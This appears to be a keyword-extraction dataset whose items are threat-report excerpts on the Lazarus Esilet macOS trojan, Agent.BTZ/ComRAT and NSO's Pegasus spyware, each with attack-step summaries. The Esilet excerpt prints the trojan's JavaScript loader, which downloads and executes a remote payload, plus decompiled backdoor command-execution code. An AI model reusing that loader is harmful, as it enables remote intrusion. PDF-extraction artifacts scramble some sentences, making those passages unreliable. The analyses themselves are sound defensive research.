asar. From the asar github repo:""Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support.""ElectronJS.org.As noted in a StackOver post titled, “How to unpack an .asar file?” one can unpack an asar archive via the following: npx asar extract app.asar destfolder.In the Esilet.app we find an asar archive (app.asar) in Contents/Resources/ and extract it in the following manner: $ npx asar extract Esilet.app/Contents/Resources/app.asar asar(unpacked)The extracted archive contains various files, most notably several JavaScript files:5/18The CISA report notes:""It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive."" -CISALet’s take a peek at the (beautified) renderer.prod.js files, specifically looking at the UpdateCheckSync function:1""./app/update.js"": function(e, t, r) { 2 async function i() { 3 var e = ""/""; 4 ""win32"" == r(""os"").platform().toLowerCase() && (e = ""\\""); 5 var t = r(""os"").tmpdir(), 6 i = ""url"" + r(""os"").platform() + "".json"", 7 n = t + e + ""Esilet-tmp"" + Math.random().toString(36).substring(8); 8 ""\\"" == e && (n += "".exe""); 9 var o = t + e + ""noEsilet-0000""; 10 try { 11 if (r(""fs"").existsSync(o)) return; 12 request = r(""./app/node_modules/request/index.js""), request({ 13 rejectUnauthorized: !1, 14 url: i 15 }, (function(t, i, o) {6/1816 if (t || !i || 200 != i.statusCode) return; 17 var a = ""url"" + JSON.parse(o).path; 18 let s = r(""fs"").createWriteStream(n); 19 request({ 20 rejectUnauthorized: !1, 21 url: a, 22 gzip: !0 23 }).pipe(s).on(""finish"", () => { 24 ""\\"" != e && r(""fs"").chmodSync(n, 511), r(""child_process"").exec(n), setTimeout((function() { 25 console.log(n), r(""child_process"").exec(n), console.log(n) 26 }), 12e3) 27 }).on(""error"", e => {}) 28 })) 29 } catch (e) {} 30 } 31 e.exports = { 32 UpdateCheckSync: i, 33 UpdateCheckAsync: async function() { 34 await new Promise(e => { 39 },This code will be automatically executed when the user opens the trojanized application.The most relevant logic of the UpdateCheckSync function can be found around line 17. Here you can see the code builds a url (base url: url and then makes a request which is written out (to a path found in the n variable).On line 24, this downloaded file is executed, via exec(n).And what is downloaded (and executed)? The CISA report states:[the application] has been observed delivering payloads of at least two different macOS variants of Manuscrypt"" -CISALet’s now take a look at the Manuscrypt (Nukesped) backdoor.Esilet: 2nd-StageAs the CISA report provides several hashes for what they refer to as the “Manuscrypt” backdoor. (We’ll stick with “NukeSped”, which seems to be the name that public AV-engines prefer).7/18The binary we’ll focus on is named Esilet-tmpg7lpp. It is an unsigned 64-bit Mach-O binary: % shasum -a256 ~/Malware/NukeSped/Esilet-tmpg7lpp Esilet-tmpg7lpp: Mach-O 64-bit executable x86_64% codesign -dvv Esilet-tmpg7lpp Esilet-tmpg7lpp: code object is not signed at allThe binary was originally submitted to VirusTotal in late 2020 (via one of Objective-See’s tools, which allows users to submit files directly to VirusTotal). Although it was originally undetected, detections have (somewhat) increased since then:Esilet-tmpg7lpp on VirusTotalWhen triaging an unknown (possibly) malicious binary, running strings (to extract, well, strings) can reveal a myriad of information: % strings - Esilet-tmpg7lppMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10 Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s8/18Content-Type: application/octet-stream Content-Length: %d User-Agent: %s Cache-Control: no-cache Pragma: no-cache Connection: keep-alive <?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""url""> <plist version=""1.0""> <dict> <key>Label</key> <string>com.%s.agent</string> <key>ProgramArguments</key> <array> <string>%s</string> <string>daemon</string> </array> <key>KeepAlive</key> <false/> <key>RunAtLoad</key> /Library/LaunchDaemons/com.%s.agent.plist %s/Library/LaunchAgents/com.%s.agent.plist ProductVersion: %d.%d.%d networksetup -getwebproxy '%s' applex.services.agent9/18 url url url @_writeSolely from the strings output we can glean various information (that sure, should be be fully confirmed via continued analysis):User-agent strings used by the binary HTTP headers used by the binary, including (custom?) cookie values An embedded launch item property list Path for the launch item property list Shell commands likely for generating a survey URLs, likely command and control (or exfil) servers curl-related APIs for networking communications API related to executing commands, reading/writing files, etc. etc.10/18In short, it appears the the Esilet-tmpg7lpp is a persistent backdoor, that affords remote attackers continued access and capabilities on an infected system.Ok, enough static analysis, let’s run Esilet-tmpg7lpp (in an isolated VM) and see what it does! The Lazarus Group are rather fond of using the libcurl APIs to provide networking capabilities for their Unsurprisingly, at least at the UI level, nothing appears amiss: implants/backdoors (e.g. OSX.WatchCat).…behind the scenes though, is another storyVial a File Monitor we can passively observe the malware persisting itself as a launch item (agent): # FileMonitor.app/Contents/MacOS/FileMonitor ""timestamp"": ""2022-05-08 07:44:28 +0000"", ""/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist"", ""path"": ""/Users/user/Desktop/Esilet-tmpg7lpp"", ""uid"": 501, ""arguments"": [""/Users/user/Desktop/Esilet-tmpg7lpp""], ""ppid"": 1380, ""ancestors"": [1380, 1379, 1377, 1], ""signing info (reported)"": { ""csFlags"": 0,11/18""platformBinary"": 0, ""signing info (computed)"": { ""timestamp"": ""2022-05-08 07:44:28 +0000"", ""/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist"", ""path"": ""/Users/user/Desktop/Esilet-tmpg7lpp"", ""uid"": 501, ""arguments"": [""/Users/user/Desktop/Esilet-tmpg7lpp""], ""ppid"": 1380, ""ancestors"": [1380, 1379, 1377, 1], ""signing info (reported)"": { ""signing info (computed)"": { }We can examine the malware’s (now-created) launch agent property list (~/Library/LaunchAgents/com.applex.services.agent.agent.plist)1<?xml version=""1.0"" encoding=""UTF-8""?> 2<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" >12/183<plist version=""1.0""> 4<dict> 5 <key>Label</key> 6 <string>com.applex.services.agent.agent</string> 7 <key>ProgramArguments</key> 8 <array> 9 <string>/Users/user/Desktop/Esilet-tmpg7lpp</string> 10 <string>daemon</string> 11 </array> 12 <key>KeepAlive</key> 13 <false/> 14 <key>RunAtLoad</key> 17</plist>Its a pretty standard persistent launch agent with:Name (Label): com.applex.services.agent.agent Path: Location where the malware was executed (e.g. ~/Desktop/Esilet-tmpg7lpp) RunAtLoad: Set to true ensuring the malware will be automatically (re)started each time the user logs in.Next, the malware attempts to beacon out to (one of) its command and control server for tasking. For example, it was observed attempting to connect to www.vinoymas.ch (which resolved to: capabilities.For example at 0x0000000100004A50 we find a function that after connecting to the server, contains a large switch statement that appears invoke various functions, based on commands received from the the server.__text:0000000100004B52 mov ecx, eax __text:0000000100004B54 sub ecx, 21279Eh __text:0000000100004B5A mov [rbp+task?], eax __text:0000000100004B5D jz loc_100004C80 __text:0000000100004B63 jmp $+5 __text:0000000100004B68 loc_100004B68: __text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h13/18__text:0000000100004B70 jz loc_100004C13 __text:0000000100004B76 jmp $+5 __text:0000000100004B7B loc_100004B7B: __text:0000000100004B7B mov eax, [rbp+task?] __text:0000000100004B7E sub eax, 38CE55h __text:0000000100004B83 jz loc_100004C3A __text:0000000100004B89 jmp $+5 __text:0000000100004B8E loc_100004B8E: __text:0000000100004B8E mov eax, [rbp+task?] __text:0000000100004B91 sub eax, 3A65F8h __text:0000000100004B96 jz loc_100004D3F __text:0000000100004B9C jmp $+5 __text:0000000100004BA1 loc_100004BA1: __text:0000000100004BA1 mov eax, [rbp+task?] __text:0000000100004BA4 sub eax, 3A6A93h __text:0000000100004BA9 jz loc_100004C5D __text:0000000100004BAF jmp $+5For example, if the instruction at line 0x0000000100004B6B (sub eax, 2AFCB2h, which operates on the tasking command from the server), results in a zero (e.g. a match), the jz (jump if zero flag is set) will be taken:__text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h __text:0000000100004B70 jz loc_100004C13The jump destination is loc_100004C13 which shortly thereafter calls a subroutine found at 0x0000000100002920This subroutine calls various other subroutines to generate an survey of the infected system. For example a subroutine at 0x0000000100004060 executes the sw_vers shell command to determine the (product and build) version of system:1var_2D0 = popen(""sw_vers"", ""r""); 2if (var_2D0 != 0x0) { 3 rax = fgets(&var_210, 0x200, var_2D0); 4 if (rax != 0x0) {14/185 rax = fgets(&var_210, 0x200, var_2D0); 6 if (rax != 0x0) { 7 sub_100003d30(&var_210); 8 rax = sscanf(&var_210, ""ProductVersion: %d.%d.%d""); 9 var_2B4 = rax; 10 if (var_2B4 == 0x3) { 11 *(int32_t *)var_298 = 0x0; 12 *(int32_t *)var_2A0 = 0x0; 13 rax = fgets(&var_210, 0x200, var_2D0); 14 if (rax != 0x0) { 15 sub_100003d30(&var_210); 16 rax = sscanf(&var_210, ""BuildVersion: %x""); 17 var_2B4 = rax; 18 if (var_2B4 == 0x1) { 19 *(int32_t *)var_2A8 = 0x0; 20 var_2B4 = 0x1; 26}…thus we know the backdoor can be remotely tasked to generate a survey of an infected system.Another taskable subroutine is found at 0x00000001000036A0. It contains code to execute a shellcommand (or script) via /bin/bash -c:1;sub_1000036a0 4 var_74 = fork(); 5 if (var_74 >= 0x0) goto loc_100003755; 6 goto loc_100003bb0; 9 if (0x0 == var_74) { 10 close(var_10); 11 if (dup2(var_C, 0x1) < 0x0) { 12 exit(*(int32_t *)error()); 13 } 14 if (dup2(var_C, 0x2) < 0x0) { 15 exit(*(int32_t *)error());15/1816 } 17 var_30 = ""/bin/bash""; 18 rax = execv(var_30, &var_30); 19 if (rax < 0x0) { 20 exit(*(int32_t *)error()); 21 } 22 exit(0x0); 23 }This affords remote attacker the ability to execute arbitrary commands on an infected system.Other taskable commands are what one would expect in a persistent backdoor (e.g. file read (and exfil), file write, etc. etc.).Esilet vs. Objective-See’s ToolsWhenever new malware is uncovered, part of that analysis is to see how it stacks up against Objective- See’s free, open-source macOS security tools.…and if our tools don’t fully detect or mitigate the malware, we then know how they can be improved!First off, let’s talk about KnockKnock which enumerates persistently installed software to detect any persistent malware. Good news, when run, KnockKnock easily uncovers and flags the malware’s launch agent:KnockKnock who's there?The metadata from the submission to VirusTotal reveals that the Esilet-tmpg7lpp binary, was initially Next, we have BlockBlock which monitors several common persistence locations. Its goal is to, at submitted via one of Objective-See's tools! How cool!? 🤗 runtime, detect any malware that attempts to persist. And again, good news, BlockBlock detect the16/18malware when it attempts to persist as a launch agent When the tools detect something suspicious, the user can submitted the item to VirusTotal for analysis. (~/Library/LaunchAgents/com.applex.services.agent.agent.plist):BlockBlock block, blocking!Finally, we have LuLu our firewall, that can alert you about unauthorized network connections. And yes, it will alert you when the malware attempts to connect to its command and control server for tasking:LuLu, unauthorized network alertConclusion17/18A recent CISA report provided a comprehensive overview of recent North Korean (Lazarus Group) hacking techniques and tools.In this blog post, we dove deeper into the macOS malware used in these attacks, further detailing the malware’s 1st and 2nd stage components, including persistence and capabilities.Finally we showed how Objective-See’s heuristic-based tools easy thwarted this malware, even with no a priori knowledge!18/18 ","{'phrases': ['Esilet', 'JavaScript', 'code', 'Nukesped', 'Malware', 'a launch agent', 'control', 'servers', 'an survey', 'commands', 'files'], 'target': 'Esilet; JavaScript; code; Nukesped; Malware; a launch agent; control; servers; an survey; commands; files.'}"
Agent.BTZ; ComRAT; the Uroburos rootkit; time; detection; the RAT.,"[' 1. The attacker compromises a system and installs the Agent.BTZ or ComRAT RAT. 2. The RAT collects system information and data from the compromised host. 3. The attacker remotely controls the RAT to further interact with the system. 4. The RAT is used to execute commands, upload/download files, and hijack communications. 5. The attacker leverages the RAT access to infiltrate further into the network. 6. Eventually, the RAT installation provides long-term backdoor access to the threat actor. ']","Extract the keywords: Evolution of sophisticated spyware: from Agent.BTZ to ComRATIn November 2014, the experts of the G DATA SecurityLabs published an article about ComRAT, the Agent.BTZ successor. We explained that this case is linked to the Uroburos rootkit. We assume that the actor behind these campaigns uses several different malware strains is order to compromise the targeted infrastructure: Uroburos, a rootkit; Agent.BTZ/ComRAT, remote administration tools or Linux malware and maybe even more.We decided to have an even closer look at Agent.BTZ and ComRAT and therefore analyzed the evolution of this RAT, covering seven years of development. Here is a table with the minimal information about 46 Ch 2.03 Ch 2.03 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04Version Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Tue Jun 19 12:41:21 2007 UTC Ch 1.0 Tue Jun 26 08:46:11 2007 UTC Ch 1.1 Ch 1.1 Tue Jun 26 08:46:11 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Thu Jul 26 07:20:17 2007 UTC Ch 1.2 Mon Dec 3 14:15:58 2007 UTC Ch 1.3 Ch 1.4 Tue Dec 11 17:36:03 2007 UTC Tue Dec 11 17:36:03 2007 UTC Ch 1.4 Tue Dec 11 17:36:03 2007 UTC Ch 1.4 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Thu Mar 27 14:58:15 2008 UTC Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Ch 1.5 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Mon May 5 11:27:48 2008 UTC Mon May 12 11:52:31 2008 UTC Thu May 22 10:24:55 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTCMon Jun 9 17:23:56 2008 UTC Ch 2.04 Thu Nov 6 13:21:45 2008 UTC Ch 2.05 Thu Nov 6 13:21:45 2008 UTC Ch 2.05 Mon Dec 29 11:37:17 2008 UTC Ch 2.07 Mon Dec 29 11:37:17 2008 UTC Ch 2.07 Mon Sep 14 13:22:57 2009 UTC Ch 2.11 Mon Sep 14 15:28:07 2009 UTC Ch 2.11 Tue Sep 29 10:28:40 2009 UTC Ch 2.12 Mon Dec 7 14:25:12 2009 UTC Ch 2.13 Ch 2.13 Mon Dec 7 14:27:53 2009 UTC Ch 2.14.1 Wed Feb 17 15:14:20 2010 UTC Ch 3.00 Tue Jan 31 16:12:25 2012 UTC Tue Feb 14 10:28:06 2012 UTC Wed Apr 4 16:23:44 2012 UTC Ch 3.02 Ch 3.10 Tue Dec 18 08:22:43 2012 UTC Fri Jun 28 12:16:40 2013 UTC Ch 3.20 Fri Jun 28 12:16:58 2013 UTC Mon Jun 24 10:51:01 2013 UTC Ch 3.20 Thu Feb 6 12:37:44 2014 UTC Ch 3.25 Ch 3.26 Thu Jan 3 18:03:46 2013 UTCThanks to the versioning, we can deduce that the compilation dates we saw and currently see actually seem to be legit – except for the last known version, in which the author modified the compilation date in order to make the analysis more complex. We can see that this malware was really active in 2007 and 2008. New versions declined in frequency in 2009 and only one new sample was identified in 2010. We did not encounter any new sample from 2011, but the malware appeared back in 2012, with a new major version.The RAT’s evolution described in ten stepsTo describe the evolution of the development, we decided to compare ten major versions:Version Ch 1.0 (2007-06) to Ch 1.5 (2008-03) Version Ch 1.5 (2008-03) to Ch 2.03 (2008-05) Version Ch 2.03 (2008-05) to Ch 2.11 (2009-09) Version Ch 2.11 (2009-09) to Ch 2.14.1 (2010-02) Version Ch 2.14.1 (2010-02) to Ch 3.00 (2012-01) Version Ch 3.00 (2012-01) to Ch 3.10 (2012-12) Version Ch 3.10 (2012-12) to Ch 3.20 (2013-06) Version Ch 3.20 (2013-06) to Ch 3.25 (2014-02) Version Ch 3.25 (2014-02) to Ch 3.26 (2013-01; date has been modified)The following chapter will present the main differences between the versions mentioned above. Here is the resemblance ratio for each version, comparing direct neighbor versions only, created using BinDiff:The biggest code update has occurred between version 2.14.1 and version 3.00. The gap matches the absence of samples during two years and this fundamental modification is what we call the death of Code similarity: 90%We did not identify strong modification between the two samples. However, we can notice the following:The configuration file (XML) in version 1.5 is stored in Unicode and not in ASCII anymore; The two versions implement a mechanism to infect new media connected to the infected system. The implementation is not exactly the same nor is the log of media infection; Code similarity: 83%In version 2.03 of Agent.BTZ, the authors changed the following:They added obfuscation in order to hide sensitive strings; The communication protocol was modified in order to include the flag “<CHCMD>” we assume that “CH” has the same meaning than “Ch” before the version number and “CMD” is the abbreviation for command; From now on, the malware supports “runas” in order to execute commands as administrator. This command was implemented by Microsoft in Windows Vista in 2007. We assume that the author implemented this feature because several targets switched to this version of Windows in 2008.According to an article, version 1.5 was used against the US Pentagon. We assume that the string Code similarity: 96%The codes of these two versions are extremely similar to each other, we can only notice small changes:The author changed the name of several registry keys (probably to avoid detection by well-known IOC); The name of two exported functions were modified, too: InstallM() becomes AddAtomT() and Code similarity: 98%These codes are really similar to each other, too. We can notice only two changes:The author patched several bugs; Four new exports appear: DllCanUnLoadNow(), DllGetClassObject(), DllRegisterServer(), DllUnregisterServer().The four exported libraries show that the malware has started to support the OLE Component ObjectModel (COM). This version is the first version able to be registered as a COM object. Three of the four Code similarity: 60%These codes really differ from each other, even if some parts of version 2.14.1 were retained. Moreover, the developers changed the compiler; they switched from Visual Studio 6.0 to Visual Studio 9.0/10.0 , which is a strong indicator for the huge differences.Version 3.00 is what the G DATA SecurityLabs experts call ComRAT. We can say that version 2.14.1 is the last version of Agent.BTZ. Here are the main differences between Agent.BTZ and ComRAT:The new malware collects more information about the infected system (such as drive information, volume information…). The media stick infection mechanism has definitely been removed. We assume this happened due to the fact that Microsoft has disabled AutoRun for external media. For the attackers, this infection vector is not interesting anymore. The malware is injected into every process of the infected machine and the main payload is executed in “explorer.exe” as we explained in our article; The communication channel to the command and control is not the same anymore. In this new version, the malware uses POST requests with the following pattern:As the malware is injected into every process of the infected system, it creates named pipe in order to handle inter-processes communication.On several 3.00 samples, the author forgot to remove the compilation path, here are some examples:c:\projects\ChinckSkx64\Debug\Chinch.pdb c:\projects\ChinckSkx64\Release\libadcodec.pdb C:\projects\ChinckSkx64\x64\Release\libadcodec.pdb E:\old_comp\_Chinch\Chinch\trunk\Debug\Chinch.pdb c:\projects\ChinchSk\Release\libadcodec.pdbThanks to these compilation paths, we assume that the original name of the RAT is “Chinch”, which leads us to the assumption that the “CH” characters in the version name and in the flag “<CHCMD>” stands for “Chinch”. In English, chinch is the word for a small North American bug, Blissus leucopterus. This word is Code similarity: 90%The codes are similar to each other, but the authors added several features:The malware generates more logs; The malware has a Mutex handle; The 3.10 version supports multiple command and control servers.The last new feature is really interesting: if the compromised targets block a specific command and control Code similarity: 93%The major new feature in the version is the new exports function called InstallW(). This exported function is used by the dropper to add persistence in the registry and to drop a second file (as explained in our previous article). Version 3.20 uses the following CLSID in order to hijack COM object: B196B286-BAB4- 101A-B69C-00AA00341D07. This object is the IConnectionPoint interface. The CLSID was only used in this version. We assume that the performed COM object hijacking generates some trouble on the infectedsystem, that’s why the author changed related things in the next version. Furthermore, the CLSID was Code similarity: 91%In the 3.25 version, the author switched to the CLSID: 42aedc87-2188-41fd-b9a3-0c966feabec1 as described in our article. Furthermore, the strings in the sample are obfuscated. The main new feature is the obfuscation – almost all strings are obfuscated and the XML pattern is not written in plain text anymore.Differences between version Ch 3.25 (2014-02) and Ch 3.26 (2013-01; date has Code similarity: 95%The version 3.26 is the latest known version. In this version:The authors removed the familiar XOR key used by Agent.BTZ and Uroburos. We assume that due to the G DATA publication in February 2014, the author decided to remove as many links as possible between Uroburos and Agent.BTZ/ComRAT/Chinch; The authors do not generate logs anymore; The compilation date has been modified, in order to make the analysis and timeline creation more complex.ConclusionThis analysis shows us seven years of the evolution of a Remote Administration Tool, used by a group which targeted extremely sensitive entities, such as the US Pentagon in 2008 or the Belgium Ministry of Foreign Affairs in 2014 as well as the Finnish Ministry of Foreign Affairs.Except for version 3.00, the modifications made are rather marginal. We can see that the authors adaptedfeatures to the Windows versions, patched bugs, added obfuscation etc… The biggest update was performed to version 3.00, after two years of silence. Visibly, this RAT was used alongside the Uroburos rootkit. Nevertheless, it is not entirely clear how and when the attackers choose to use the RAT or the rootkit or whether both are used in parallel.Taking everything into consideration, G DATA SecurityLabs experts are sure that the group behind Uroburos/Agent.BTZ/ComRAT/Linux tool/… will remain an active player in the malware and APT field. The newest revelations made and connections drawn let us believe that there is even more to come. ","{'phrases': ['The attacker', 'the Agent', 'BTZ', 'the RAT', 'data', 'control', 'commands'], 'target': 'The attacker; the Agent; BTZ; the RAT; data; control; commands.'}"
the attacker; a text; a link; Safari; Webkit; vulnerabilities; Kernel Information; Kernel; persistence; the device; the spyware; information; commands; encryption; commands; data; the user; the user; operators; commands; data; exfiltration; the device; commands; encryption; the infected device.,"['1. The attack starts by sending the target a phishing message containing a malicious link. 2. When the user clicks the link, an exploit chain called Trident is triggered: Stage 1: A Webkit exploit (CVE-2016-4655) for initial code execution. Stage 2: Kernel info leak (CVE-2016-4656) to bypass kernel ASLR. Stage 3: Kernel exploits (CVE-2016-4657) to jailbreak the device. 3. The jailbreak installs the Pegasus spyware persistently and hides its icon. 4. The spyware exfiltrates data like messages, contacts, and passwords. 5. It can record audio, video, intercept calls and texts in real-time. 6. Pegasus uses encryption, obfuscation and stealth to avoid detection and can self-destruct if threatened. ']","Extract the keywords: Technical Analysis of Pegasus SpywareAn Investigation Into Highly Sophisticated Espionage SoftwareContentsExecutive SummaryBackground Disclosure TimelineAttack OverviewProfessional Grade Development Evolution of SoftwareThe Trident VulnerabilitiesCVE-2016-4655: Memory Corruption in Safari Webkit CVE-2016-4656: Kernel Information Leak Circumvents KASLR CVE-2016-4657: Memory Corruption in Kernel leads to Jailbreak Jailbreak PersistenceSpyware AnalysisInstallation and PersistencePersistence: JSC Privilege EscalationDisabling Updates Stealth Update to Command & Control Infrastructure Self DestructionData GatheringCalendar Capturing User Passwords WiFi and Router PasswordsInterception of Calls and MessagesProcess Injection: converter ViberReal-Time EspionageConclusion Credits Appendix A: TLS Certificate Information Appendix B: IOCs for Jailbreak DetectionExecutive SummaryThis report is an in-depth technical look at a targeted espionage attack being actively leveraged against an undetermined number of mobile users around the world. Lookout researchers have done deep analysis on a live iOS sample of the malware, detailed in this report. Citizen Lab’s investigation links the software andinfrastructure to that of NSO Group which offers a product called Pegasus solution. Pegasus is professionally developed and highly advanced in its use of zero-day vulnerabilities, code obfuscation, and encryption. It uses sophisticated func- tion hooking to subvert OS- and application-layer security in voice/audio calls and apps including Gmail, Facebook, WhatsApp, Facetime, Viber, WeChat, Telegram, Apple’s built-in messaging and email apps, and others. It steals the victim’s contact list and GPS location, as well as personal, Wi-Fi, and router passwords stored on the device. The iOS version of the attack uses what we refer to as Trident, an exploit of three related zero-day vulnerabilities in iOS, which Apple patched in iOS 9.3.5, available as of the publishing of this report.According to news reports, NSO Group sells weaponized software that targets mobile phones to governments and has been operating since 2010, according to its LinkedIn page. The Pegasus spyware has existed for a significant amount of time, and is advertised and sold for use on high-value targets for multiple purposes, including high-level espionage on iOS, Android, and Blackberry.This spyware is extremely sophisticated and modular, in addition to allowing customization. It uses strong encryption to protect itself from detection by traditional security tools and has a vigorous monitoring and self-destruct mechanism. Lookout’s analysis determined that the malware exploits three zero-day vulnerabilities, Trident, in Apple’s iOS:1. CVE-2016-4655: Memory Corruption in Webkit - A vulnerability in Safari WebKit allows the attacker to compro-mise the device when the user clicks on a link.2. CVE-2016-4656: Kernel Information Leak - A kernel base mapping vulnerability that leaks information to theattacker that allows him to calculate the kernel’s location in memory.3. CVE-2016-4657: Kernel Memory corruption leads to Jailbreak - 32 and 64 bit iOS kernel-level vulnerabilities thatallow the attacker to silently jailbreak the device and install surveillance software.The attack sequence begins with a simple phishing scheme: send a text (or Twitter or other type of) message with a benign-looking URL, user clicks on link, open web browser, load page, exploit a browser or operating system vulnerability, install software to gather information and to ensure that the software stays installed on the device (“persistence”). As soon as the targeted victim clicks the link, the attack occurs silently, with no indication to the user or device administrators that anything has occurred or that any new processes are running.The Pegasus software is highly configurable: depending on the country of use and feature sets purchased by the user of the spyware, the surveillance capabilities include remotely accessing text messages, iMessages, calls, emails, logs, and more from apps including Gmail, Facebook, Skype, WhatsApp, Viber, Facetime, Calendar, Line, Mail.Ru, WeChat, Surespot, Tango, Telegram, and others.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 3Based on artifacts in the code, this spyware has been in the wild for more than two years. The exploits have configuration settings that go all the way back to iOS 7, which was released in 2013 and superseded in 2014.Pegasus takes advantage of how integrated mobile devices are in our lives and the combination of features only available on mobile — always connected (WiFi, 3G/4G), voice communications, camera, email, messaging, GPS, passwords, and contact lists. As a result of its functional modularity, the breadth of communications and user data it monitors, and the tai- lored methods it instruments into other applications to exfiltrate data from them, to date, Pegasus is the most sophisticat- ed privately-developed attack Lookout has encountered on a mobile endpoint. It hooks into widely used secure messen- ger applications to copy cleartext data out of them before the user’s app can encrypt and send it. From the perspective of the user and the people they’re communicating with, their communications are secure, while the administrator of the Pegasus instance has secretly intercepted the clear text of their communication. Pegasus carries a high price tag averaging at over $25,000 per target. In at least one instance, NSO Group sold 300 licenses for $8 million USD.1This report presents the technical details of the attack from the beginning of the exploit chain to the end. It includes analysis of the Trident zero-day iOS vulnerabilities that the toolkit was using to jailbreak the phone. We also look in-depth at the components of the espionage software, and have exposed the type of capabilities that an advanced mobile attack- er using this software possesses.Trident (the vulnerabilities disclosed in coordination with this report) were present in the latest versions of iOS, up to iOS 9.3.4, the latest iOS version as of August 2016 when we made these discoveries. Researchers from Lookout and Citizen Lab responsibly disclosed the exploits and their related vulnerabilities to Apple. Given the severity of Trident, Apple worked extremely quickly to patch these vulnerabilities and has released iOS 9.3.5 to address them. With the release of the patched OS, we are publishing the technical details of the attack and exploits.1 url ANALYSIS OF PEGASUS SPYWARE | 4BackgroundAs mobile phones continue to be tightly integrated into our personal and work lives, malicious actors are actively creating sophisticated applications that can run on victims’ devices without either their knowledge of the threat’s presence, or of the actors’ intent. This can be seen in the diversity of threats that target mobile devices: from those that are financially mo- tivated, such as adware, banking trojans, and SMS fraud, to those seeking personal information or corporate intellectual property. Spyware, a malicious application designed to retrieve specific information from an infected device without the victim’s knowledge, falls into the latter camp.Spyware applications often include the ability to extract a victim’s SMS messages, contact details, record their calls, access their call logs, or remotely activate a device’s microphone and camera to surreptitiously capture audio, video, and image content.In addition to these rich features, some spyware also has the equally important ability to remotely deliver the malicious application to a target device. This is a complex and technically challenging problem, as evidenced by the amount of money private security firms and corporate bug bounty programs pay for zero-day exploits that facilitate this remote delivery.Two private security firms, Gamma Group and Hacking Team, both made headlines after media outlets revealed that the organizations developed mobile surveillance software that has been sold to oppressive governments. These products are often very expensive and generally only accessible to well-funded attackers given the complexity involved in creating this kind of mobile spyware, and the fact that it includes zero-day exploits.The Israeli based NSO Group has managed to avoid the spotlight of the cyber security community despite being in oper- ation for over five years. Founded in 2010 by Niv Carmi, Shalev Hulio, and Omri Lavie, NSO Group has publicly stated that it develops and sells mobile phone surveillance software to governments around the world. It has claimed that its surveil- lance capability is undetectable with one of the founders stating, “We’re a complete ghost.” 2 Private equity firm Francisco Partners acquired NSO Group in 2014 for $110 million. The founders of NSO Group play in both the cyber offense and defense spaces, having also founded the mobile security company Kaymera.32 url 3 url ANALYSIS OF PEGASUS SPYWARE | 5Disclosure TimelineCitizen Lab reported the existence of the malware to Lookout on August 12, 2016. Lookout and Citizen Lab worked together to analyze the software and attempt to determine the severity of the vulnerabilities and the capabilities of the malware until August 15, 2016 when we reported the information to Apple.The three organizations worked together from August 15, 2016 to the release of the vulnerability patches in iOS 9.3.5 on August 25, 2016.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 6Attack OverviewThe attack is very simple in its delivery and silent in delivering its payload. The attack starts when the attacker sends a website URL (through SMS, email, social media, or any other message) to an identified target. The user only has to take one action--click on the link. Once the user clicks the link, the software silently carries out a series of exploits against the victim’s device to remotely jailbreak it so that the espionage software packages can be installed. The user’s only indication that anything happened will be that the browser closes after the link is clicked.The espionage software contains malicious code, processes, and apps that are used to spy, collect data, and report back what the user does on the device. This spyware can access and exfiltrate messages, calls, emails, logs, and more from apps including, but not limited to:Facetime TelegramCVE-2016-4655 Exploit against SafariTwo kernel exploits (CVE-2016-4656 & CVE-2016-4657) jailbreak the device1. Persistence and stealth monitoring2. Establishes communication to Command & Control Infrastructure3. Hooks all communication and starts stealing dataIn order to accomplish this, the spyware, once it jailbreaks the user’s phone, does not download malicious versions of these apps to the victim’s device in order to capture data, rather it compromises the original apps already installed on the device. This includes pre-installed apps such as Facetime and Calendar and those from the official App Store.Usually, iOS security mechanisms prevent normal apps from spying on each other, but spying “hooks” can be installed on a jailbroken device. Pegasus takes advantage of both the remote jailbreak exploit and a technique called “hooking.” The hooking is accomplished by inserting Pegasus’ dynamic libraries into the legitimate processes running on the device. These dynamic libraries can be used to hook the apps using a framework called Cydia Mobile Substrate, known to the iOS jailbreak community, and which Pegasus uses as part of the exploit.A user infected with this spyware is under complete surveillance by the attacker because, in addition to the apps listed above, it also spies on: • Audio and video communications that (in the words a founder of NSO Group) turns the phone into a “walkie-talkie”4SMS messages the victim sends or receives4 url ft.com%2Fcms%2Fs%2F0%2F9869fd34-c7ac-11e2-be27-00144feab7de.html%3Fsiteedition%3Dintl&_i_referer=&classification=conditional_stan- dard&iab=barrier-app#axzz4I8PLStjSTECHNICAL ANALYSIS OF PEGASUS SPYWARE | 7Access to this content could be used to gain further access into other 